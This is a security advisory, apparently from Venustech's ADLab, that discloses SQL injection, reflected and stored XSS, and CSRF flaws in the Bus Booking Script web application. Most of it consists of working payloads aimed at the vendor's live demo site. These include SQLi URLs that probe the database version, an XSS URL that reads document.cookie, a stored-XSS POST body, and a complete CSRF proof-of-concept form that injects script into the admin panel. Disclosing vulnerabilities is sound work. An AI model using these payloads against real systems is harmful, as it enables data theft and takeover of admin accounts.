### Bus Booking Script- the lastest version - SQL Injection/XSS/CSRF

#### ADLab of Venustech


Well,  when I pentest the official demo site of Bus Booking Script, I found some vulnerabilities here.


#### SQL Injection:

Because of the waf, I tried to write a script to get sensitive sql data.
As you can see here, we can obtain the current database user and the mysql version or more sensitive data now!
For example:
```
http://travelbookingscript.com/demo/newbusbooking/admin/view_seatseller.php?sp_id=47 and length(version())<12--+-
http://travelbookingscript.com/demo/newbusbooking/admin/view_member.php?memid=1%20order%20by%2028--+-
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Bus-Booking-Script/sqli1.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Bus-Booking-Script/sqli2.png)



#### XSS:

Here I found some xss, inclue stored-xss and reflect-xss：

##### Reflect-Xss
```
http://travelbookingscript.com/demo/newbusbooking/results.php?triptype=1&ter_from=123&tag=123&datepicker=08-01-2018123%27%22%3E%3Cimg%20src=x%20onerror=%22console.log(document.cookie)%22%3E&datepicker1=&type=bus
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Bus-Booking-Script/xss1.png)

##### Stored-Xss

http://travelbookingscript.com/demo/newbusbooking/admin/new_master.php

POST parameters:
```
flag=1&spname=test4x&spemail=test%40gmail.com'"><img src=x onerror=alert(123)><'"&txtaddress1=test&spcity=test&spmobileno1=1314411331&comm_sp=51&spcmnts=test4x&submitnewcompany=Register+%3E%3E
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Bus-Booking-Script/xss2.png)

This stored-xss vulnerability need to be combined with csrf attack.

#### CSRF

POC is here , for example, we can add a xss content to the admin panel:

```
<html>
 <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://travelbookingscript.com/demo/newbusbooking/admin/new_master.php" method="POST">
      <input type="hidden" name="flag" value="1" />
      <input type="hidden" name="spname" value="test4x" />
      <input type="hidden" name="spemail" value="test&#64;gmail&#46;com&apos;&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;123&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="txtaddress1" value="test" />
      <input type="hidden" name="spcity" value="test" />
      <input type="hidden" name="spmobileno1" value="1314411331" />
      <input type="hidden" name="comm&#95;sp" value="51" />
      <input type="hidden" name="spcmnts" value="test4x" />
      <input type="hidden" name="submitnewcompany" value="Register&#32;&gt;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Bus-Booking-Script/csrf.png)










